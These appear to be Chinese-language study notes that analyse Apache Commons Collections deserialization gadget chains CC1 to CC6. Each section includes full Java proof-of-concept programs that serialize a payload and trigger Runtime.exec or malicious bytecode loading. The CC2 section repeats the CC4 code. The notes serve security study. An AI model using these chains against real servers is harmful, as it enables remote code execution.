## CC1-TransformedMap-commons.collections 3.2.1\<JDK8u71

### 代码

```java
package org.cc.cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception {
        //1.客户端构建攻击代码
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        //反射机制调用AnnotationInvocationHandler类的构造函数
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //取消构造函数修饰符限制
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        Object instance = ctor.newInstance(Target.class, outerMap);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(instance);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();
    }

}
```

### 相关函数及过程分析

**ChainedTransformer**

![Untitled](attachments/CC链%20attachments/Untitled.png)

将传入的Object数组遍历，第一个数组的尾部作为第二个的参数，形成链式调用

**ConstantTransformer**

![Untitled](attachments/CC链%20attachments/Untitled%201.png)

对传入的Object对象返回一个iConstant对象

**InvokerTransformer**

![Untitled](attachments/CC链%20attachments/Untitled%202.png)

反射实现危险方法

transform方法可以实现任意命令执行

全局去找了transform的使用，白日梦组长的切入是checkSetValue，就依照这个为切入点

![Untitled](attachments/CC链%20attachments/Untitled%203.png)

![Untitled](attachments/CC链%20attachments/Untitled%204.png)

valueTransformer的值来自于TransformedMap的赋值，但是由于是protected修饰再不同包无法调用

![Untitled](attachments/CC链%20attachments/Untitled%205.png)

但是有静态方法decorate确定valueTransformer值可控，现在需要去查找调用了checkSetValue方法的地方

在AbsrtactInputCheckedMapDecorator中有对checkvalue的调用，setValue中

![Untitled](attachments/CC链%20attachments/Untitled%206.png)

莫约是将Map中集合遍历就可以触发setvalue

然后就是寻找对setValue方法的调用，readobject优先

`AnnotationInvocationHandler` 完美调用

![Untitled](attachments/CC链%20attachments/Untitled%207.png)

进入逻辑要保证通过if判断到setValue

![Untitled](attachments/CC链%20attachments/Untitled%208.png)

```java
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
//反射机制调用AnnotationInvocationHandler类的构造函数
Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
//取消构造函数修饰符限制
ctor.setAccessible(true);
//获取AnnotationInvocationHandler类实例
Object instance = ctor.newInstance(Target.class, outerMap);
```

然后就是getruntime反射，ChainedTransformer

## CC2-commons.collections 4.0->=JDK8u71

> 1、构造一个TemplatesImpl的恶意类转为字节码，然后反射注入到TemplatesImpl对象的_bytecodes属性
2、创建一个InvokerTransformer并传递一个newTransformer方法，然后将InvokerTransformer方法名传递给TransformeringComparator
3、通过反射构造PriorityQueue队列的comparator和queue两个字段，将PriorityQueue队列的comparator字段设置为TransformingComparator，然后将queue字段设置为TemplatesImpl对象，触发利用链


```java
package org.cc.cc1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.ChainedTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaa");
        Field bytecodeField = tc.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("D:\\JavaSec\\CCdebug\\target\\classes\\org\\cc\\cc1\\test.class"));
        byte[][] codes = {code};
        bytecodeField.set(templates, codes);

//        Field tfactoryField = tc.getDeclaredField("_tfactory");
//        tfactoryField.setAccessible(true);
//        tfactoryField.set(templates, new TransformerFactoryImpl());
//        //templates.newTransformer();

        org.apache.commons.collections4.functors.InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        org.apache.commons.collections4.Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer<>(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(2);

        Class c = transformingComparator.getClass();
        Field transformerField = c.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator, chainedTransformer);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(priorityQueue);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();
    }

}
```

## CC3

对父类的判断

![Untitled](attachments/CC链%20attachments/Untitled%209.png)

也就是需要加载的恶意类满足父类的限制

![Untitled](attachments/CC链%20attachments/Untitled%2010.png)

报错的原因是为抽象类，需要实现抽象方法

[https://www.notion.so](https://www.notion.so)

只有一个抽象方法transform

![Untitled](attachments/CC链%20attachments/Untitled%2011.png)

再实现后再运行CC3就可以执行了

![Untitled](attachments/CC链%20attachments/Untitled%2012.png)

这个时候就说明只要调用了TemplatesImpl.newTransformer方法就可以执行恶意代码

转化为ChainedTransformer的链式调用后，将cc6中的LazyMap利用挪过来就可以实现反序列化

```java
package org.cc.cc1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaa");
        Field bytecodeField = tc.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("D:\\JavaSec\\CCdebug\\target\\classes\\org\\cc\\cc1\\test.class"));
        byte[][] codes = {code};
        bytecodeField.set(templates, codes);

        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        //templates.newTransformer();

        org.apache.commons.collections.Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null, null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(1);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazyMap= LazyMap.decorate(map, chainedTransformer);
        //反射机制调用AnnotationInvocationHandler类的构造函数
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationdhdConstructor = cl.getDeclaredConstructor(Class.class, Map.class);
        //取消构造函数修饰符限制
        annotationInvocationdhdConstructor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        InvocationHandler h = (InvocationHandler) annotationInvocationdhdConstructor.newInstance(Override.class, lazyMap);//注解可以任意传只需过异常判断

        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class}, h);
        Object o = annotationInvocationdhdConstructor.newInstance(Override.class, mapProxy);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(o);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();
    }
}
```

在ysoserial中采用了不一样的执行方法

同样是从newTransformer的用法查找开始

![Untitled](attachments/CC链%20attachments/Untitled%2013.png)

可以用TrAXFilter类，但是没有反序列化接口，考虑和Runtime类似的方法

![Untitled](attachments/CC链%20attachments/Untitled%2014.png)

先实例化TrAXFilter类，到图中代码事实上已经代码执行了

## CC4-commons.collection4

```java
package org.cc.cc1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.ChainedTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaa");
        Field bytecodeField = tc.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("D:\\JavaSec\\CCdebug\\target\\classes\\org\\cc\\cc1\\test.class"));
        byte[][] codes = {code};
        bytecodeField.set(templates, codes);

//        Field tfactoryField = tc.getDeclaredField("_tfactory");
//        tfactoryField.setAccessible(true);
//        tfactoryField.set(templates, new TransformerFactoryImpl());
//        //templates.newTransformer();

        org.apache.commons.collections4.functors.InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        org.apache.commons.collections4.Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer<>(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(2);

        Class c = transformingComparator.getClass();
        Field transformerField = c.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator, chainedTransformer);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(priorityQueue);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();
    }

}

```

## CC5-commons.collection3.2.1 JDK8u71

前面与CC1的lazymap一致

改为了通过一个新的类TiedMapEntry来调用后续的LazyMap链

getValue()调用get



toString调用了getValue方法



利用类变为`BadAttributeValueExpException` 里面的readObject方法，其中有对java安全管理器设置的判断需要`System.*getSecurityManager*() == null` 

然后就通过`val = valObj.toString();` 来调用TiedMapEntry中的toString方法

将val值设置为TiedMapEntry类，然后在valObj = gf.get(”val”, null);设置为valObj最后valObj.toString()就调用了TiedMapEntry的toString方法





```java
package org.cc.cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazyMap= LazyMap.decorate(map, transformerChain);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "wumonster");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        Class c = Class.forName("javax.management.BadAttributeValueExpException");
        Field field = c.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,tiedMapEntry);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(badAttributeValueExpException);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();

    }
}
```

## CC6-commons.collection 不限 JDK 不限

最好的cc链！！！

与ysoserial中cc1的差别就是解决了高版本的兼容问题

从LazyMap#get去接着查找调用

![Untitled](attachments/CC链%20attachments/Untitled%2020.png)

找到TiedMapEntry，其getValue存在对get方法的调用

![Untitled](attachments/CC链%20attachments/Untitled%2021.png)

![Untitled](attachments/CC链%20attachments/Untitled%2022.png)

在TiedMapEntry方法中的调用顺序是

hashCode→getValue→get

接下来找哪里调用了TiedMapEntry#hashCode

P牛的java安全漫谈中对ysoserial进行了简化

通过`java.util.HashMap#readObject` 调用hash(key),然后再通过hash(key)来调用key.hashCode()

**POC**

```java
package org.cc.cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazymap = LazyMap.decorate(map, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "aaa");

        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");
        lazymap.remove("aaa");

        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazymap, chainedTransformer);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(map2);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();
    }
}
```